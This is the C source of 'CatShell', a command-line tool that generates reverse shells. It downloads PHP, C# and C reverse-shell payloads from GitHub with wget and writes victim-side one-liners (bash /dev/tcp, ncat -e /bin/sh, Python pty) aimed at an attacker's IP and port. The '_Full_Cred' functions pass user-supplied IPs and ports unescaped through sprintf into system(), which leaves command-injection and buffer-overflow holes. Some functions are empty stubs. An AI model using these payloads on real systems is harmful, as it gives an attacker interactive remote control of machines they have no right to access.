#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Normal Functions   ********************************************   Normal Functions \\ 

void PrintHelp();
void GetPhp();
void GetShell();
void GetC();
void GetCsharp();
void GetNcat();
void GetPython();

// Functions With Full Cred *******************************************   Functions With Full Cred \\ 

void GetPhp_Full_Cred();
void GetShell_Full_Cred();
void GetCsharp_Full_Cred();
void GetNcat_Full_Cred();
void GetC_Full_Cred();
void GetPython_Full_Cred();

 // Global Variables ***************************************** Global Variables \\ 

char * argument1;
char * argument;
char * ip_port;
char * ip_addr;
char * argument_ip;

// Main Function  *******************************************   Main Function\\ 

int main(int argc , char* argv[])
{
	// If Statements ************************************* If Statements // 

	if (argc < 2 || argc == 1)
	{
		printf("CatShell version 0.0.3\n\nUse -h or --help for help\n");
	}
	else if ((strcmp(argv[1],"-h"))==0 || (strcmp(argv[1],"--help"))==0 )
	{
		// (strcmp(argv[1],"--type"))==0 && argc == 3
		PrintHelp();
	}
	else if ((strcmp(argv[1],"--type"))==0 && argc == 3 )
	{
		argument = argv[2];
		if ((strcmp(argument,"php")==0))
		{
			GetPhp();
		}
		else if ((strcmp(argument,"shell")==0))
		{
			GetShell();
		}
		else if ((strcmp(argument,"csharp")==0))
		{
			GetCsharp();
		}
		else if ((strcmp(argument,"ncat")==0))
		{
			GetNcat();
		}
		else if ((strcmp(argument,"c")==0))
		{
			GetC();
		}
		else if ((strcmp(argument,"python")==0))
		{
			GetPython();
		}
		else
		{	
			printf("Usage : --type <php,shell,csharp,c,ncat>\n");
		}
		
	}
	else if ((strcmp(argv[1],"-t"))==0 && argc == 3 )
	{
		argument = argv[2];
		if ((strcmp(argument,"php")==0))
		{
			GetPhp();
		}
		else if ((strcmp(argument,"shell")==0))
		{
			GetShell();
		}
		else if ((strcmp(argument,"csharp")==0))
		{
			GetCsharp();
		}		
		else if ((strcmp(argument,"ncat")==0))
		{
			GetNcat();
		}
		else if ((strcmp(argument,"c")==0))
		{
			GetC();
		}
		else if ((strcmp(argument,"python")==0))
		{
			GetPython();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
		
	}
	else if ((strcmp(argv[1],"-t"))==0 && (strcmp(argv[3],"--ip"))==0 && (strcmp(argv[5],"-p"))==0 &&argc == 7 )
	{
		//ip_addr = argv[3]; ./program[0] -t[1] php[2] --ip[3] 127.0.0.1[4] -p[5] 0000[6]
		argument_ip = argv[2];
		ip_addr = argv[4];
		ip_port = argv[6]; 


		if ((strcmp(argument_ip,"php")==0))
		{
			void GetPhp_Full_Cred();
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
		
	}
	else if ((strcmp(argv[1],"-t"))==0 && (strcmp(argv[3],"--ip"))==0 && (strcmp(argv[5],"--port"))==0 &&argc == 7 )
	{
		//ip_addr = argv[3]; ./program[0] -t[1] php[2] --ip[3] 127.0.0.1[4] -p[5] 0000[6]
		argument_ip = argv[2];
		ip_addr = argv[4];
		ip_port = argv[6]; 


		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : ./catshell -t <php,shell,csharp,c,ncat>\n");
		}


	}
	else if ((strcmp(argv[1],"--type"))==0 && (strcmp(argv[3],"--ip"))==0 && (strcmp(argv[5],"--port"))==0 &&argc == 7 )
	{
		//ip_addr = argv[3]; ./program[0] -t[1] php[2] --ip[3] 127.0.0.1[4] -p[5] 0000[6]
		argument_ip = argv[2];
		ip_addr = argv[4];
		ip_port = argv[6]; 
	

		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
	}
	else if ((strcmp(argv[1],"--ip"))==0 && (strcmp(argv[3],"-p"))==0 && (strcmp(argv[5],"-t"))==0 &&argc == 7 )
	{
		// ./revshell[0] --ip[1] 127.0.0.1[2] -p[3] 0[4] -t[5] something[6]
		argument_ip = argv[6];
		ip_addr = argv[2];
		ip_port = argv[4];



		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}

	}
	else if ((strcmp(argv[1],"--ip"))==0 && (strcmp(argv[3],"-p"))==0 && (strcmp(argv[5],"-t"))==0 &&argc == 7 )
	{
		// ./revshell[0] --ip[1] 127.0.0.1[2] -p[3] 0[4] -t[5] something[6]
		argument_ip = argv[6];
		ip_addr = argv[2];
		ip_port = argv[4];



		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
	}
	else if ((strcmp(argv[1],"--ip"))==0 && (strcmp(argv[3],"--port"))==0 && (strcmp(argv[5],"--type"))==0 &&argc == 7 )
	{
		// ./revshell[0] --ip[1] 127.0.0.1[2] -p[3] 0[4] -t[5] something[6]
		argument_ip = argv[6];
		ip_addr = argv[2];
		ip_port = argv[4];



		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}

	}
	else if ((strcmp(argv[1],"--ip"))==0 && (strcmp(argv[3],"--port"))==0 && (strcmp(argv[5],"-t"))==0 &&argc == 7 )
	{
				// ./revshell[0] --ip[1] 127.0.0.1[2] -p[3] 0[4] -t[5] something[6]
		argument_ip = argv[6];
		ip_addr = argv[2];
		ip_port = argv[4];



		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}

	}

	else if  ((strcmp(argv[1],"-t"))==0 && (strcmp(argv[3],"--ip"))==0 &&argc == 5)
	{
		// ./program[0] -t[1] php[2] --ip[3] 127.0.0.1[4]
		printf("Usage : ./catshell -t <type> --ip <ip> -p <port>\n\nPort : \"I'm sleeping where are u\"\n");
	}

	else
	{
		printf("Invalid parameter !\n\nUse -h or --help for help\n");
	}
	return 0;
}

void PrintHelp()
{
	printf("Usage : ./catshell [OPTION] .. [FILE]\n\nOptions :\n\n-h --help print this help page\n-t --type <php,csharp,shell,c,ncat>\n-o --output output file\n-p --port specify a port number <1 to 65,535>\n\nLong Options :\n\n--ip specify an ip address <bash , ncat , python > later updates\n\nContact me when you find bugs <mrtankgt@outlook.com> MrEbrahimXD\n");
}

void GetPhp()
{
	printf("[*] Php RevShell Copied to current dir \n\n");
	system("wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php \n");
}

void GetShell()
{
	printf("[*] Made shell_revshell.txt UDP and TCP Change Ip and Port \n");
	system("echo \"Victim : sh -i >& /dev/tcp/<ip>/<port> 0>&1\nAttacker : nc -lnvp <port>\" > shell_revshell_tcp.txt && echo \"Victim : sh -i >& /dev/udp/<ip>/<port> 0>&1\nAttacker : nc -lnvp <port>\" > shell_revshell_udp.txt \n\n");
}

void GetCsharp()
{
	printf("[*] Made C# script at current dir \n");
	system("wget https://raw.githubusercontent.com/MrEbrahimXD/Raw-For-Revshell/main/csharp.cs \n");
}

void GetNcat()
{
	printf("[*] Ncat : ncat_help.txt created\n\n");
	system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
}

void GetC()
{
	printf("[*] C programming script created\n\n");
	system("wget https://raw.githubusercontent.com/MrEbrahimXD/Raw-For-Revshell/main/c_revshell.c \n");
}

void GetPython()
{
	printf("[*] Python RevShell Copied\n");
	system("echo \"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<ip>\",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\" > python_shell.txt \n");
}


// ****************************************************************************************************** \\ 
// IP Functions ---------------------------------------------------------------------------- IP Functions \\ 
// ****************************************************************************************************** \\ 

void GetPhp_Full_Cred()
{

}

void GetShell_Full_Cred()
{
	char cmd[192];
	printf("[*] Made shell_revshell.txt UDP and TCP with %s:%s\n" , ip_addr , ip_port );
	sprintf(cmd , "echo \"Victim : sh -i >& /dev/tcp/%s/%s 0>&1\nAttacker : nc -lnvp %s\" > shell_revshell_tcp.txt && echo \"Victim : sh -i >& /dev/udp/%s/%s 0>&1\nAttacker : nc -lnvp %s\" > shell_revshell_udp.txt \n\n" , ip_addr , ip_port , ip_port , ip_addr , ip_port , ip_port);
	system(cmd);

}

void GetCsharp_Full_Cred()
{

}

void GetNcat_Full_Cred()
{
	char cmd[86];
	printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
	sprintf(cmd , "echo \"Victim : ncat -e /bin/sh %s %s \nListener : ncat -lnvp %s\" > ncat_help.txt \n" , ip_addr , ip_port , ip_port );
	system(cmd);
}

void GetC_Full_Cred()
{

}

void GetPython_Full_Cred()
{
	char cmd[159];
	printf("[*] Python : python_revshell.txt made with %s:%s \n" , ip_addr , ip_port);
	sprintf(cmd , "echo \"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\" > python_revshell.txt \n" , ip_addr , ip_port );
	system(cmd);
}


